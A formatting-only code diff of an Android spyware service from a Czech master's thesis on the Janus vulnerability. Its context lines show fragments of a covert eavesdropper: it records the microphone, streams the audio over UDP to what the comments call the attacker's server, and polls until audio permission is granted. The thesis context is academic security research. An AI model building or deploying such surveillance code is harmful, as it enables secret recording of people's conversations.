@@ -1,4 +1,4 @@
-// Tento kod je součást diplomové práce Využití zranitelnosti Janus na operačním systému Android
+// Tento kód je součást diplomové práce Využití zranitelnosti Janus na operačním systému Android
 // Autor: Bc. Vít Souček
 //
 // Zdroje: Uvedeny v komentářích u jednotlivých metod
@@ -81,7 +81,7 @@ public class EavesdropService extends Service {
      * Následuje cyklus, ve kterém se nahrávají data z mikrofonu
      * odesílají se na útočníkův server.
      * Když je cyklus ukončen, všechny na začátku inicializované objekty jsou uvolněny.
-     *
+     * <p>
      * Způsob nahrávání zvuku je založen na odpovědi na StackOverflow otázku
      * 'Stream Live Android Audio to Server'.
      * Autor odpovědi: chuckliddell0, dostupné z:
@@ -115,7 +115,8 @@ public class EavesdropService extends Service {
 
                     try {
                         socket.send(packet);
-                    } catch (IOException ignored) { }
+                    } catch (IOException ignored) {
+                    }
                 }
 
                 if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
@@ -130,7 +131,7 @@ public class EavesdropService extends Service {
         return START_STICKY;
     }
 
-    private void initializeNetworking(){
+    private void initializeNetworking() {
         try {
             socket = new DatagramSocket();
         } catch (SocketException e) {
@@ -150,19 +151,20 @@ public class EavesdropService extends Service {
      * Inicializuje všechny objekty potřebné pro nahravani zvuku.
      * Recorder je nutny a pokud je obsazeny, ceka se na jeho uvolneni.
      * Echo canceller a Noise suppressor jsou pouze pro zlepseni kvality.
-     *
+     * <p>
      * Spravny zpusob inicializace potrebnych objektu je zalozen na odpovedi na StackOverflow otazku
      * 'Stream Live Android Audio to Server'.
      * Autor odpovedi: chuckliddell0, dostupne z:
      * https://stackoverflow.com/a/15694209/6136143
      */
-    private void initializeAudioRecording(){
+    private void initializeAudioRecording() {
         recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, minBufSize);
 
         while (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
             try {
                 TimeUnit.SECONDS.sleep(2);
-            } catch (InterruptedException ignored) { }
+            } catch (InterruptedException ignored) {
+            }
             recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, sampleRate, channelConfig, audioFormat, minBufSize);
         }
 
@@ -197,7 +199,7 @@ public class EavesdropService extends Service {
     /**
      * Čeká, než uživatel aplikaci přidělí potřebná oprávnění (ze service nelze oprávnění vyžadovat)
      * Je nutné testovat pouze RECORD_AUDIO, INTERNET je získán automaticky.
-     *
+     * <p>
      * Způsob zjišťování přidělených oprávnění byl přejat z odpovědi na StackOverflow.com otázku
      * 'Android Studio asking for permission check after permission checked'.
      * Autor odpovědi: rafsanahmad007, dostupné z:
@@ -208,7 +210,8 @@ public class EavesdropService extends Service {
                 != PackageManager.PERMISSION_GRANTED) {
             try {
                 TimeUnit.SECONDS.sleep(2);
-            } catch (InterruptedException ignored) { }
+            } catch (InterruptedException ignored) {
+            }
         }
     }
 }
